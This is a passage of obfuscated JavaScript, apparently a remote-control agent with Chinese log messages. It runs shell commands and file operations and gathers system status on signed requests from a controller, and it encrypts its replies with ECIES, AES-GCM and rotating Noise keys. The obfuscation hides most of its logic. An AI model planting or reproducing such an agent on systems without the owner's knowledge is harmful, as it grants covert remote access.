        'qZPCv2LUzg93CW',
        'zgLbqK8',
        'Cu9jwha',
        'y0fpy0O',
        'g1SZm21Bv0fstL0BwZbTiezjtevFuK9pvcdLHAJPG6JLGjNPGiNML6dMLyGSioMzJEE6P+wiSow9K+wjJEw3PEs9NoEBRUw9LtOG',
        's2rlyMq',
        'EfveAKO',
        'BxvSDgLWBguGDhvUBMvSCYbLEgLZDcbVBIbWB3j0ia',
        'qwvYBeS',
        'BM93',
        'D3jPDgvvsw50mZjcrq',
        'ywvZlti1nI1Ny20',
        'vNPtvgO',
        'Cg9YDcbTDxn0igjLigfUigLUDgvNzxiGyMv0D2vLBIaXigfUzca2ntuZnq',
        'C2ffueK',
        'CgLWzq',
        'DxbSB2fKrMLSzvjHDW',
        'wuDVuxC',
        'DK9tAwW',
        'qw93tuq',
        'l2LUzgv4lMH0BwW',
        'CgvLCK1HEezYyw1L',
        'zNntAxPL',
        'uMrAsMO',
        'y29WEuzPBgvtEw5J',
        'Dgv4Da',
        'rKLmrv9st09u',
        'zxjYB3i',
        'z2v0u2vJB25KCW',
        'zwrNzsbJB25Uzwn0Aw9UigLKBguGDgLTzw91Da',
        'AwyTBw9KAwzPzwqTC2LUy2u',
        'reXXtfm',
        'zxHPC3rZu3LUyW',
        'y3jVBKPVyNm',
        'u1PNy0O',
        'C2v0',
        'qY5vveyToa',
        '4P2mioE7IoERR+s8MUIVNEw8GUw4UdOG',
        'q2fWj24GuhjVDg8GCg9PBNrLCIbVDxqGB2yGyM91BMrZ',
        '4PYfie5VAxnLioApOEAjI+wUJoAiKo+8JoERR+wiSoERR+wkOowVHUMaMUMbK+w3SUw7UUERI++8Gq',
        'sKzUAgy',
        'runjrvnFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0ios4JEwTMowCQa',
        'yNPOzu8',
        'DxbKyxrLq29UzMLN',
        'AxrLBxm',
        'C3DHChvZzwq',
        'wc1bDxrOlvrVA2vU',
        'Bw9Kzv9Vy3rHBa',
        'thz0y1m',
        'DuzMv3u',
        'ufDewvu',
        's3v3z2e',
        'yLH2v3m',
        'BfDswfi',
        'rhDgAM8',
        'tK9Su0y',
        'vgrXDe8',
        'ywXSB2m',
        'vNLLr3m',
        't3P5uMm',
        'wuTms3i',
        'C3DHCf90B3rHBa',
        'vgzxrxi',
        'z2vUzxjHDgvqywLY',
        'AKHgsLC',
        'BxnNuxvLDwu',
        'y29UDgvUDc1Syw5NDwfNzq',
        'sKXkEfa',
        'y2yTChjVEhKT',
        'zgLZA190B3rHBa',
        'wMnmB3q',
        'DJeUma',
        'oNbHDgG',
        'q0zmvKq',
        'w0Tnt0rfxsdWN5QaieTnt0rfpti6ioMAP+MbK+wFN+wqJEwWHUs4IUAkPEIhS+wKLUMdQow5S+wpSa',
        'zwnKC2fqDwjRzxK',
        'mtaW',
        'quDftLrFvKvsu0LptG',
        'zxHWzwn0zwrszw1VDgvqDwjcnJq',
        'y2LWAgvYDgv4Da',
        'x2v4CgLYzun1CNjLBNq',
        't1v3rMG',
        'y0TJu2W',
        'C2HPzNq',
        'wNPfqLq',
        'x2HHBMrSzvjHD01LC3nHz2u',
        'ruTbyva',
        'C2v0vtG',
        'y29UDgvUDc1Yyw5Nzq',
        'qNjjAvu',
        'Ahr0Chm6lY9HCgKUAxbPzNKUB3jN',
        'yNfOBNG',
        'vLzvrNq',
        'v0HzuMy',
        'uNrRzLG',
        '8j+sOsdKV67LPi3LU7RORQ46ioIVT+wCQoMHUEEBRUEBRUw9LEs4I+I/KoIHJcbUCg0GAw5ZDgfSBcbaBhLKzwXSl25VzguTChr5',
        'z1nzq1a',
        'zg9JA2vY',
        'tMXXELq',
        'CNvU',
        'BgLZDgvU',
        'D2vIC29JA2v0uhjVEhK',
        'z1D5Ehu',
        's1PhBNi',
        'x3DHA2u',
        'Cg9eEve',
        'z29KzxO',
        'A1zwsK0',
        'ywDLBNq',
        '4PQG77Ipievdsuvt5ywS6zkL6kEJ56cb5AsX6lsLoIa',
        'C2vJlxDLyNnVy2TLDc1RzxK',
        'AxneAxi',
        'q29UBMvJDgLVBJOGvxbNCMfKzq',
        'qwzjvNm',
        'rMfPBgvKihrVihbHCNnLifvstcbMCM9T',
        'C09Au28',
        'ChjVBwLZzxm',
        'wxruwxC',
        'Cer3se8',
        'uL9psW',
        'xsdWN5QOioIUPoIVGEwKSEI0PE+8JoMDNUAZLsbuB2TLBU+8Gq',
        'zuXjtxO',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTtwv0Ag9KCW',
        'Bwv0yvjLCxvLC3rLza',
        's0Lxrhq',
        'tK93shi',
        'wM5wAxC',
        'tM9PC2uGv0fttsbTB2r1BguGBM90igf2ywLSywjSzq',
        'zxHPDa',
        'zgf0yq',
        't2zjrxe',
        'A0L5re4',
        'BgvUz3rO',
        'y2yTy2XVDwrMBgfYzwqTChjVEhKTy29UBMvJDgLVBI11CgDYywrL',
        'y29UDgfPBMvYpwX4yW',
        'r25kBu8',
        'q2DQDNK',
        'rLrZyMy',
        'CgDHwNa',
        'twjmsKS',
        'uhjxrxO',
        'xsdIMQdVUi8G5OYh5lUK5Ase55cg5BYc5BI4oIa',
        '8j+uJcdNU4JNQ6/OV5VNQiVPGidLH7OGkenVzgu6ia',
        'Dxb0Aw1L',
        'u2vYDMvYigXPC3rLBMLUzYbZDwnJzxnZzNvSBhK',
        'u3LZDgvTsw5MB0nVBgXLy3rVCIbPBML0AwfSAxPLza',
        '5O+H5OMl5PYQ5A6m5OIq77Ym5PEG5Rov6kEJ5A+g5PwW5O2U',
        'v1P6v08',
        'CMvHzev4ywn0',
        'r1zHweG',
        'ChjVy2vZCW',
        'CvLfyum',
        'EwzduuK',
        'C3D0BMu',
        'Ahr0Chm6lY9Py2fUAgf6AxaUy29T',
        'w0Tnt0rfoNnOEI5HBf0G',
        'uM52tNm',
        'BMv0D29YAW',
        'CgHHC2u',
        'EfLkBu0',
        'DgHLBG',
        'AKPowvi',
        'zxHWzwn0',
        'rLnqELG',
        'A2v5x2LK',
        'zKPLBLu',
        'C3rVChbLza',
        'zxDJu2e',
        'y3jLyxrLsgfZAa',
        'g1SZmw1Brvjst1jDg1SWBsa',
        'CMvWBgfJzq',
        'AxnbCNjHEq',
        'rvfkA1m',
        'yNjHBMq',
        'D0rWtNu',
        'BKLTwfK',
        'A2vYBMvS',
        'swnRD0C',
        'vvjmqKe',
        'n3WZFdeXFdf8mtb8oxW1Fdr8nNWYFdb8oa',
        'uwXhr0u',
        'Aw5KzxHpzG',
        'Aw5MBgf0zvjHD1n5BMm',
        'y3jVBNrHC2TZ',
        'C3rYzwfTia',
        'x2DLDerPC2TjBMzV',
        'CMvWB3j0u2H6ywW',
        'DurhAu4',
        'BvfZrgy',
        'yLHQs3y',
        'A29vzuG',
        'BgfZDeLUzgv4t2y',
        'u2PhueK',
        'y21KihjLCxvPCMvK',
        'whPLu2K',
        'vK1dzeS',
        'wLjRvK0',
        'Bg9JywXqCML2qJy0',
        'z2v0twLUDxrLCW',
        'ufvuioIMHUEBLUEkTUAaGtOG',
        'rw13A1q',
        'zMXVB3i',
        'CMvQzwn0',
        'u3L2sgm',
        'Ag5YELu',
        'y29UBMvJDgLVBG',
        'CMvHzgrPCLn5BMm',
        'zMr2C3K',
        'Ag9ZDg5HBwu',
        'C3rKAw4',
        'CKHIB2q',
        'l2fWAs9MAwXLl2f1DgHVCML0Eq',
        'tM90igeGEMLWigzPBgu6ia',
        'zMvOAuu',
        'mZyWma',
        'AhPbD1a',
        'tKH4zKW',
        'sKjbu2C',
        'sw5PDgLHBgL6Aw5Nifn5C3rLBuLUzM9dB2XSzwn0B3iUlI4',
        'C3vIyxjYyxK',
        'qwTxvwS',
        'x3bHCNnLtw9Kzq',
        'AgXswLy',
        'g1SZm21Bv0fstL0BwZbTia',
        'teforW',
        'BhHJ',
        'yvn0rgq',
        'BKvmAwK',
        'Ahr0CdOVlZeYnY4WlJaUmtO',
        'AeHAsNa',
        't01yvhi',
        'tw1iswO',
        'AKj6tLu'
    ];
    a0a = function () {
        return gv;
    };
    return a0a();
}
function a0E() {
    const b5 = a0aW, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p[b5(0x1d5)](),
            process[b5(0x44a)]()
        ];
    for (const b of a) {
        if (b && a0l[b5(0x5ec)](b) && a0l[b5(0x380)](b)[b5(0x535)]())
            return b;
    }
    return process[b5(0x44a)]();
}
function a0F() {
    const b6 = a0aW;
    let a = null;
    try {
        a = a0p['homedir']();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[b6(0x5ec)](d) && a0l[b6(0x380)](d)['isDirectory']())
            return d;
        if (d)
            console[b6(0x711)](b6(0x5b7) + d);
    }
    return console['log'](b6(0x5d0) + process[b6(0x44a)]()), process[b6(0x44a)]();
}
class a0G {
    constructor(a = 'ok') {
        this['status'] = a;
    }
}
class a0H extends a0G {
    constructor(a = 'ok', b = 0x0) {
        const b7 = a0aW;
        super(a), this[b7(0x7e6)] = b;
    }
}
class a0I extends a0G {
    constructor() {
        const b8 = a0aW, a = b8(0x3d3)[b8(0x4c0)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[b8(0x575)] = '';
                continue;
            case '1':
                this[b8(0x609)] = 0x0;
                continue;
            case '2':
                this[b8(0x81b)] = 0x0;
                continue;
            case '3':
                this['arch'] = '';
                continue;
            case '4':
                super();
                continue;
            case '5':
                this[b8(0x3b6)] = null;
                continue;
            case '6':
                this[b8(0x16d)] = '';
                continue;
            case '7':
                this[b8(0x511)] = null;
                continue;
            case '8':
                this[b8(0x5ae)] = a0P[b8(0x619)];
                continue;
            case '9':
                this['os'] = '';
                continue;
            case '10':
                this[b8(0x611)] = 0x0;
                continue;
            case '11':
                this[b8(0x506)] = '';
                continue;
            case '12':
                this[b8(0x3ad)] = 0x0;
                continue;
            case '13':
                this[b8(0x52d)] = '';
                continue;
            case '14':
                this[b8(0x348)] = '';
                continue;
            case '15':
                this[b8(0x14f)] = null;
                continue;
            }
            break;
        }
    }
}
class a0J extends a0G {
    constructor() {
        const b9 = a0aW, a = { 'iMRbo': b9(0x47c) }, b = a[b9(0x82f)][b9(0x4c0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b9(0x363)] = { 'usage': 0x0 };
                continue;
            case '1':
                this['disk'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '2':
                this[b9(0x65b)] = 0x0;
                continue;
            case '3':
                this[b9(0x669)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '4':
                this[b9(0x552)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '5':
                this['ram'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '6':
                this['load'] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '7':
                this[b9(0x2b4)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '8':
                super();
                continue;
            case '9':
                this[b9(0x7df)] = '';
                continue;
            case '10':
                this[b9(0x662)] = 0x0;
                continue;
            }
            break;
        }
    }
}
class a0K extends a0G {
    constructor() {
        const ba = a0aW;
        super(), this[ba(0x1e0)] = '', this[ba(0x211)] = 0x0, this[ba(0x5c8)] = ![], this[ba(0x576)] = '';
    }
}
class a0L {
    constructor() {
        const bb = a0aW, a = { 'LIiAR': bb(0x84a) }, b = a[bb(0x376)][bb(0x4c0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bb(0x3db)] = '';
                continue;
            case '1':
                this[bb(0x887)] = '';
                continue;
            case '2':
                this[bb(0x2be)] = '';
                continue;
            case '3':
                this[bb(0x2df)] = '';
                continue;
            case '4':
                this[bb(0x275)] = '';
                continue;
            case '5':
                this['mode_octal'] = '';
                continue;
            case '6':
                this['size'] = 0x0;
                continue;
            case '7':
                this['type'] = '';
                continue;
            }
            break;
        }
    }
}
class a0M {
    constructor() {
        const bc = a0aW;
        this['path'] = '', this['name'] = '', this[bc(0x275)] = '', this['mode_octal'] = '', this[bc(0x55f)] = '', this[bc(0x3e9)] = ![], this[bc(0x6ee)] = ![], this[bc(0x55c)] = ![];
    }
}
class a0N extends a0G {
    constructor() {
        const bd = a0aW;
        super(), this[bd(0x57a)] = [];
    }
}
class a0O {
    static [a0aW(0x436)]() {
        const be = a0aW, a = {
                'jqBBt': be(0x268),
                'lBYvv': be(0x850),
                'GqdeG': be(0x6e7),
                'Diclc': function (i, j) {
                    return i !== j;
                },
                'JZqPg': function (i, j) {
                    return i !== j;
                },
                'nrmwW': be(0x7f9)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[be(0x6c4)](a['jqBBt']), d = b[be(0x885)]({ 'format': be(0x850) }), f = c[be(0x885)]({ 'format': a['lBYvv'] }), g = Buffer['from'](d['d'], a[be(0x4fc)]), h = Buffer[be(0x7e4)](f['x'], a['GqdeG']);
        return (a[be(0x3f0)](g[be(0x650)], 0x20) || a['JZqPg'](h[be(0x650)], 0x20)) && a0D[be(0x5e7)](be(0x7ab)), {
            'private_b64': g['toString'](be(0x7f9)),
            'public_b64': h[be(0x491)](a[be(0x729)])
        };
    }
    static [a0aW(0x6e6)](a) {
        const bf = a0aW, b = this[bf(0x436)]();
        return {
            'role': a,
            'private_b64': b[bf(0x34e)],
            'public_b64': b['public_b64']
        };
    }
    static [a0aW(0x60b)](a = a0aW(0x879), b = 'Agent') {
        const bg = a0aW, c = {
                'control': this['generateSingle'](a),
                'agent': this[bg(0x6e6)](b)
            };
        return c;
    }
}
class a0P {
    static ['Rtimeout'] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aW(0x377)] = (process.env.EXEC_SHELL || a0aW(0x344))[a0aW(0x40a)]() === a0aW(0x344);
    static ['DEBUG'] = (process.env.DEBUG || 'false')[a0aW(0x40a)]() === a0aW(0x344);
    static [a0aW(0x582)] = parseInt(process.env.TIMESTAMP_WINDOW || a0aW(0x6a2));
    static [a0aW(0x814)] = parseInt(process.env.LOG_LEVEL || (this[a0aW(0x550)] ? '0' : '3'), 0xa);
    static ['ECDSA_PUBLIC_KEY_PEM'] = a0P['_getConfigValue'](a0aW(0x48c), a0aW(0x333)) || 'ECDSA公钥内容';
    static [a0aW(0x2c8)] = a0P[a0aW(0x4a7)]('ECIES_PUBKEY', a0aW(0x2c5)) || 'ECIES公钥内容';
    static [a0aW(0x7ad)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0aW(0x809)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0aW(0x5b3), 0xa);
    static [a0aW(0x5e6)] = a0F();
    static [a0aW(0x803)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0aW(0x735));
    static [a0aW(0x29e)] = (process.env.FOLLOW_SYMLINKS || a0aW(0x543))[a0aW(0x40a)]() === 'true';
    static [a0aW(0x762)] = (process.env.FILE_AUDIT_LOG || a0aW(0x344))[a0aW(0x40a)]() === a0aW(0x344);
    static [a0aW(0x569)] = !![];
    static [a0aW(0x3ea)] = [];
    static [a0aW(0x683)] = {};
    static ['cronloop'] = ![];
    static [a0aW(0x1cc)] = parseInt(process.env.TASK_TIMEOUT || a0aW(0x536));
    static [a0aW(0x763)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aW(0x20d)] = [];
    static [a0aW(0x3d4)] = [];
    static ['MAX_TASK_LOG_SIZE'] = parseInt(process.env.MAX_TASK_LOG || a0aW(0x618));
    static [a0aW(0x289)] = process.env.HOST || a0aW(0x566);
    static [a0aW(0x70f)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || '8000');
    static [a0aW(0x42a)] = (process.env.KMODE || '0')[a0aW(0x343)]() || '0';
    static [a0aW(0x568)] = (process.env.KNAME || '')['trim']();
    static ['KNAME_KEY'] = (process.env.KNAME_KEY || '')[a0aW(0x343)]();
    static ['KPATH'] = process.env.KPATH || '';
    static [a0aW(0x619)] = process.env.AGENT_VERSION || a0aW(0x366);
    static [a0aW(0x18c)] = a0k[a0aW(0x273)](0x20)[a0aW(0x491)]('base64');
    static [a0aW(0x831)] = a0O[a0aW(0x60b)]();
    static [a0aW(0x6d4)]() {
        const bh = a0aW, a = {
                'YKLKr': bh(0x7f9),
                'glvXe': bh(0x4bb)
            };
        return a0k[bh(0x4df)]('sha256', Buffer[bh(0x7e4)](this[bh(0x18c)], a[bh(0x608)]))[bh(0x1a8)](a[bh(0x4ca)])[bh(0x454)](bh(0x7f9));
    }
    static [a0aW(0x27b)]() {
        const bi = a0aW, a = { 'ssbEG': '🔄\x20[SECURITY]\x20临时密钥过期,\x20已轮换\x20SESSION_KEY\x20与控制端\x20Noise\x20密钥对\x20(合法控制端需重新认证获取\x20baseinfo\x20新密钥)' }, b = a0O['generatePair']();
        this['NOISE_KEYS_INTERNAL'][bi(0x588)] = b[bi(0x588)], this[bi(0x509)][bi(0x79b)]['private'] = b[bi(0x588)][bi(0x34e)], this['SESSION_KEY'] = a0k[bi(0x273)](0x20)[bi(0x491)](bi(0x7f9)), this[bi(0x2a8)] = null, this[bi(0x5a8)] = 0x0, this['_status_cache'] = null, this['_status_cache_time'] = 0x0, a0D['warn'](a[bi(0x238)]);
    }
    static [a0aW(0x509)] = {
        'controller': { 'private': this['NOISE_KEYS_INTERNAL']['control'][a0aW(0x34e)] },
        'agent': { 'public': this[a0aW(0x831)][a0aW(0x638)][a0aW(0x777)] }
    };
    static ['BASEINFO_CACHE_TTL'] = 0xe10;
    static [a0aW(0x72d)] = 0x1e;
    static ['_baseinfo_cache'] = null;
    static [a0aW(0x5a8)] = 0x0;
    static [a0aW(0x476)] = null;
    static [a0aW(0x577)] = null;
    static [a0aW(0x2b2)] = 0x0;
    static [a0aW(0x758)] = null;
    static [a0aW(0x4a7)](a, b) {
        const bj = a0aW, c = { 'pVMdx': bj(0x736) }, d = process.env[a];
        if (d)
            return d;
        const f = a0o[bj(0x2f9)](__dirname, b);
        if (a0l[bj(0x5ec)](f))
            try {
                return a0l[bj(0x31f)](f, c[bj(0x80f)])[bj(0x343)]();
            } catch (g) {
            }
        return '';
    }
    static [a0aW(0x1b3)]() {
        const bk = a0aW, a = {
                'sIrzA': 'ECDSA_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecdsa_pub.pem\x20不存在',
                'wYZpr': bk(0x5f5),
                'pqMhC': function (b, c) {
                    return b > c;
                },
                'kIyDN': bk(0x3d7),
                'SQcgL': bk(0x3ac),
                'XXYio': '\x20\x20\x202.\x20或将密钥文件放入\x20./keys/\x20目录\x20(运行\x20generate_keys.py\x20生成)'
            };
        if (!this['DEBUG']) {
            const b = [];
            !this[bk(0x858)] && b[bk(0x24a)](a[bk(0x832)]), !this[bk(0x2c8)] && b[bk(0x24a)](a[bk(0x290)]), a[bk(0x314)](b[bk(0x650)], 0x0) && (a0D[bk(0x5e7)]('❌\x20配置校验失败\x20(非DEBUG模式必须配置密钥):'), b['forEach'](c => a0D[bk(0x5e7)](bk(0x315) + c)), a0D['debug'](a[bk(0x64f)]), a0D[bk(0x768)](a[bk(0x7d4)]), a0D['debug'](a[bk(0x42f)]), process[bk(0x64c)](0x1));
        }
    }
    static ['merge'](a = {}) {
        const bl = a0aW, b = {
                'JLXOR': function (c, d) {
                    return c !== d;
                },
                'nEUjm': function (c, d, f) {
                    return c(d, f);
                }
            };
        if (!a)
            return;
        b['JLXOR'](a[bl(0x70f)], undefined) && a['PORT'] !== null && (this[bl(0x70f)] = b[bl(0x25d)](parseInt, String(a['PORT']), 0xa)), a[bl(0x858)] && (this[bl(0x858)] = a[bl(0x858)][bl(0x343)]()), a[bl(0x2c8)] && (this[bl(0x2c8)] = a[bl(0x2c8)]['trim']());
    }
}
class a0Q {
    constructor() {
        const bm = a0aW;
        this[bm(0x4a9)] = null, this[bm(0x51d)] = null;
    }
    [a0aW(0x80e)](a) {
        const bn = a0aW, b = bn(0x6f1)['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                a0D[bn(0x4dd)](bn(0x1cd) + this[bn(0x4a9)][bn(0x670)] + bn(0x2dd) + a + '\x20小时');
                continue;
            case '1':
                if (this[bn(0x4a9)])
                    return this['_key'];
                continue;
            case '2':
                return this['_key'];
            case '3':
                this[bn(0x4a9)] = this[bn(0x73b)](a);
                continue;
            case '4':
                this['_expireCurrent']();
                continue;
            }
            break;
        }
    }
    [a0aW(0x52f)]() {
        const bo = a0aW;
        this[bo(0x61c)]();
        if (this[bo(0x4a9)])
            return this[bo(0x4a9)][bo(0x715)];
        return null;
    }
    [a0aW(0x7cc)]() {
        const bp = a0aW;
        this['_expireCurrent']();
        if (this[bp(0x4a9)])
            return this[bp(0x4a9)]['ecies_pub'];
        return null;
    }
    [a0aW(0x61c)]() {
        const bq = a0aW, a = {
                'kdOUI': function (b, c) {
                    return b === c;
                },
                'EQJkS': 'function'
            };
        if (this[bq(0x4a9)] && this[bq(0x4ce)](this['_key'])) {
            const b = this['_key'][bq(0x670)];
            this[bq(0x4a9)] = null, a0D[bq(0x3d2)](bq(0x56c) + b);
            if (a[bq(0x48b)](typeof this['onExpired'], a[bq(0x678)]))
                try {
                    this['onExpired']();
                } catch (c) {
                    a0D[bq(0x5e7)](bq(0x733) + c[bq(0x7df)]);
                }
        }
    }
    [a0aW(0x4ce)](a) {
        const br = a0aW, b = {
                'sMHqD': function (c, d) {
                    return c >= d;
                },
                'yrBYG': function (c, d) {
                    return c / d;
                }
            };
        return b[br(0x5bd)](Math[br(0x695)](b[br(0x50f)](Date[br(0x5d5)](), 0x3e8)), a[br(0x3d6)]);
    }
    [a0aW(0x73b)](a) {
        const bs = a0aW, b = {
                'aStDd': 'pkcs8',
                'zxPHf': bs(0x257),
                'AIEAc': function (l, m) {
                    return l / m;
                },
                'MiIxL': bs(0x86d),
                'aWxeB': function (l, m) {
                    return l + m;
                }
            }, {
                privateKey: c,
                publicKey: d
            } = a0k['generateKeyPairSync']('ec', { 'namedCurve': bs(0x6bf) }), f = c[bs(0x885)]({
                'type': b[bs(0x6ae)],
                'format': 'pem'
            }), g = d[bs(0x885)]({
                'type': bs(0x724),
                'format': b[bs(0x56a)]
            }), h = a0k[bs(0x273)](0x20), i = Buffer[bs(0x7e4)](a0B[bs(0x558)](h, ![])), j = Math['floor'](b['AIEAc'](Date[bs(0x5d5)](), 0x3e8)), k = a * 0xe10;
        return {
            'key_id': a0k[bs(0x273)](0x8)[bs(0x491)](b[bs(0x86a)]),
            'created_at': j,
            'expires_at': b[bs(0x7aa)](j, k),
            'ttl_seconds': k,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[bs(0x491)](bs(0x86d)),
            'ecies_public_key': i[bs(0x491)](b[bs(0x86a)]),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0R {
    constructor(a, b) {
        const bt = a0aW, c = {
                'HXwVo': bt(0x338),
                'cKZgX': bt(0x7f9),
                'hzAwP': function (d, f) {
                    return d(f);
                },
                'jGoeU': function (d, f) {
                    return d(f);
                },
                'pgLyw': bt(0x848)
            };
        this[bt(0x617)] = null, this[bt(0x561)] = null;
        if (a)
            try {
                const d = a[bt(0x343)]();
                if (d[bt(0x2eb)](c[bt(0x40e)]))
                    this[bt(0x617)] = a0k['createPublicKey'](d);
                else {
                    const f = Buffer[bt(0x7e4)](d, c[bt(0x468)]), g = a0A[bt(0x44e)]['fromBytes'](f), h = g[bt(0x204)](![]), i = m => m[bt(0x491)](bt(0x7f9))[bt(0x676)](/\+/g, '-')[bt(0x676)](/\//g, '_')['replace'](/=/g, ''), j = c[bt(0x6a3)](i, Buffer[bt(0x7e4)](h[bt(0x500)](0x1, 0x21))), k = c[bt(0x3f7)](i, Buffer[bt(0x7e4)](h[bt(0x500)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c['pgLyw'],
                            'x': j,
                            'y': k
                        };
                    this[bt(0x617)] = a0k['createPublicKey']({
                        'key': l,
                        'format': bt(0x850)
                    });
                }
            } catch (m) {
                a0D[bt(0x5e7)]('⚠️\x20ECDSA公钥加载失败:\x20' + m[bt(0x7df)]), this[bt(0x617)] = null;
            }
        if (b)
            try {
                this[bt(0x561)] = a0w['toByteArray'](b['trim']());
            } catch (n) {
                a0D['warn'](bt(0x639) + n[bt(0x7df)]);
            }
    }
    [a0aW(0x175)](a, b, c, d, f, g, h = null) {
        const bu = a0aW, i = {
                'BKSDy': function (j, k) {
                    return j(k);
                },
                'mNOdk': function (j, k) {
                    return j / k;
                },
                'rTeKc': function (j, k) {
                    return j > k;
                },
                'KARzN': function (j, k) {
                    return j - k;
                },
                'DIsOv': function (j, k) {
                    return j - k;
                },
                'dHQGB': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'hMbIn': bu(0x372),
                'DCRvC': bu(0x300),
                'KXmIl': bu(0x241)
            };
        if (!this[bu(0x617)])
            throw new Error('ECDSA\x20public\x20key\x20not\x20loaded');
        try {
            const j = i['BKSDy'](parseInt, f), k = Math[bu(0x695)](i[bu(0x82d)](Date[bu(0x5d5)](), 0x3e8));
            if (i['rTeKc'](Math[bu(0x81d)](i[bu(0x2aa)](k, j)), a0P[bu(0x582)]))
                throw new Error('Timestamp\x20expired:\x20diff=' + Math['abs'](i['DIsOv'](k, j)) + 's\x20>\x20' + a0P[bu(0x582)] + 's');
            const l = i['dHQGB'](a0S, a, b, c, d, f);
            if (this[bu(0x87d)](this['ecdsaPubkey'], l, g))
                return i[bu(0x409)];
            if (h && this[bu(0x87d)](h, l, g))
                return i['DCRvC'];
            throw new Error(i['KXmIl']);
        } catch (m) {
            throw new Error(bu(0x6b7) + m[bu(0x7df)]);
        }
    }
    [a0aW(0x87d)](a, b, c) {
        const bv = a0aW, d = { 'NOlSF': bv(0x326) };
        if (!a)
            return ![];
        try {
            const f = a0w[bv(0x570)](c), g = a0k[bv(0x760)](d[bv(0x603)]);
            return g[bv(0x1a8)](b), g['verify'](a, f);
        } catch (h) {
            return ![];
        }
    }
    ['encryptResponse'](a, b = null) {
        const bw = a0aW, c = {
                'jTfEh': 'utf-8',
                'tsYqu': function (d, f, g) {
                    return d(f, g);
                }
            };
        if (a0P['DEBUG'])
            return JSON[bw(0x7ce)](a);
        if (!this[bw(0x561)])
            throw new Error(bw(0x200));
        try {
            const d = JSON['stringify'](a), f = Buffer[bw(0x7e4)](d, c[bw(0x5bc)]), g = b || Buffer[bw(0x7e4)](this[bw(0x561)]), h = c[bw(0x4f8)](a0v, g, f);
            return Buffer[bw(0x7e4)](h)['toString']('base64');
        } catch (i) {
            throw new Error(bw(0x71d) + i[bw(0x7df)]);
        }
    }
    [a0aW(0x15a)](a, b) {
        const bx = a0aW, c = {
                'vHXTM': function (d, f) {
                    return d !== f;
                },
                'ZRkVM': bx(0x33f),
                'bEZIf': bx(0x7f9),
                'MchsA': bx(0x5d7),
                'nWlWJ': bx(0x736)
            };
        if (!b || c['vHXTM'](b[bx(0x650)], 0x20))
            throw new Error(c[bx(0x690)]);
        try {
            const d = Buffer[bx(0x7e4)](a, c['bEZIf'])[bx(0x491)](bx(0x736)), f = JSON[bx(0x4d3)](d);
            if (!f[bx(0x817)] || !f[bx(0x36e)] || !f[bx(0x61b)])
                throw new Error('Missing\x20required\x20AES-GCM\x20fields\x20(nonce,\x20tag,\x20ciphertext)\x20in\x20payload.');
            const g = Buffer['from'](f['nonce'], c[bx(0x4e7)]), h = Buffer[bx(0x7e4)](f[bx(0x36e)], c['bEZIf']), i = Buffer['from'](f[bx(0x61b)], c['bEZIf']), j = a0k[bx(0x5cb)](c[bx(0x2bf)], b, g);
            j[bx(0x4f4)](h);
            let k = j['update'](i, null, c['nWlWJ']);
            return k += j[bx(0x21d)](c['nWlWJ']), k;
        } catch (l) {
            throw new Error(bx(0x28c) + l[bx(0x7df)]);
        }
    }
    ['encryptData'](a, b) {
        const by = a0aW, c = {
                'ZXJKY': function (d, f) {
                    return d !== f;
                },
                'KIVEu': by(0x524),
                'wBtNj': by(0x5d7),
                'jJNYR': by(0x7f9),
                'skrGn': 'utf8'
            };
        if (!b || c[by(0x6cb)](b[by(0x650)], 0x20))
            throw new Error(c['KIVEu']);
        try {
            const d = a0k[by(0x273)](0xc), f = a0k[by(0x38b)](c[by(0x456)], b, d), g = Buffer[by(0x85e)]([
                    f[by(0x1a8)](a),
                    f[by(0x21d)]()
                ]), h = f[by(0x25e)](), i = {
                    'nonce': d[by(0x491)](c[by(0x66d)]),
                    'tag': h[by(0x491)](c[by(0x66d)]),
                    'ciphertext': g[by(0x491)](c[by(0x66d)])
                };
            return Buffer[by(0x7e4)](JSON[by(0x7ce)](i), c['skrGn'])[by(0x491)](c[by(0x66d)]);
        } catch (j) {
            throw new Error('AES\x20Encrypt\x20Error:\x20' + j[by(0x7df)]);
        }
    }
}
function a0S(a, b, c, d, f) {
    const bz = a0aW, g = {
            'jmKmR': bz(0x16c),
            'SdImE': bz(0x86d)
        };
    return !c && (c = a0k[bz(0x674)](g[bz(0x7c7)])[bz(0x1a8)](Buffer[bz(0x605)](0x0))[bz(0x454)](g[bz(0x6bb)])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0T(a, b = null) {
    const bA = a0aW, c = {
            'dkJCJ': bA(0x47d),
            'ngUZR': bA(0x543),
            'gtlYW': function (d, f) {
                return d === f;
            },
            'clzNv': bA(0x1fc),
